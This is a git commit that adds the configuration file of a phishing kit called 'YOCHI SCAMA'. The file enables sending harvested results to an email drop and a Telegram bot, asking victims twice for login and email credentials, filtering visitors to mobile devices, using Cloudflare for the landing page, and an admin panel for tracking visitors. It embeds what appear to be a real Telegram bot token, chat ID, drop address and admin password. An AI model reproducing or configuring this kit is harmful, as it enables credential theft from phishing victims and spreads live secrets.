c64b38a2e24d07956ae04330e60fbc28a83e8e10
hsacreepz <112184039+hsacreepz@users.noreply.github.com>
2023-06-12 16:50:08 +0300

    Add files via upload

---
+++ settings.php
@@ -0,0 +1,37 @@
+<?php
+###########################################################################################################
+# <------- YOCHI SCAMA CONFIGURATION FILE <></>
+/*
+TOGGLE ON / OFF:
+1 : ENABLE.
+0 : DISABLE.
+USE 1 OR 0 to SET FEATURES ON OR OFF*/
+
+$mobileonly=0;                     # <--- BLOCK ALL DEVICES THAT ARE NOT MOBILE
+$createfolderpersession=0;         # <--- CREATE A NEW FOLDER FOR EACH SESSION
+$usecaution=1;                     # <--- INDICATE WHETHER YOU WANT TO USE CAUTION OR NOT	
+$ftpsave=0;                        # <--- SAVE RESULTS ON SCAMAHOMEFOLDER/rst/.....
+$sendtoemail=1;                    # <--- SEND RESULTS TO EMAIL
+$sendtotg=1;                       # <--- SEND RESULTS TO TELEGRAM
+$doubleloginentry=1;               # <--- REQUEST TWICE FOR LOGIN DETAILS
+$confirmemaillog=1;                # <--- REQUEST TWICE FOR EMAIL ACCESS DETAILS
+$cloudflarelanding=1;              # <--- USE CLOUDFLARE FOR LANDING PAGE
+$send = "botinfo@qpit1l.4nmn.com,";   # <--- YOUR EMAIL/EMAILS SEPARATED BY COMMAS
+$tgbot = "5376926969:AAGj9S-ENk4sZmqAwOGUkUXhJAVdJbP_Vzw";         # <--- YOUR TELEGRAM BOT TOKEN WITHOUT "bot" AS PREFIX
+$chatid = "-631841015";               # <--- YOUR TELEGRAM CHAT ID
+$resultheading = "🎌 YOCHI 🎌";      # <--- WHAT YOUR RESULTS SHOULD DISPLAY AS TOP 
+$adminpanel = 1;                   # <--- ENABLE ADMIN PANEL
+$adminpass = "ITiswell18@x";                   # <--- YOUR PASSWORD TO VIEW ADMIN PANEL
+// goto yourdomain.com/admin/index.php to track visiting activity
+/*  ___      ___      _______  __
+    \  \    /  /     /  _____||  |
+     \  \  /  /	    /  /      |  |
+      \  \/  /	   |  |	      |  |___    O
+       \    /____  |  |       |   ___ \	 _
+        |  |/_ _ \ |  |       |  |   \ || |
+        |  | o_o  | \  \____  |  |   | || |
+        |__|\____/   \______| |__|   | ||_|      grrrr
+	Telegram : @yo_chi
+	If you experience any issues or for upgrade
+									   */
+?>
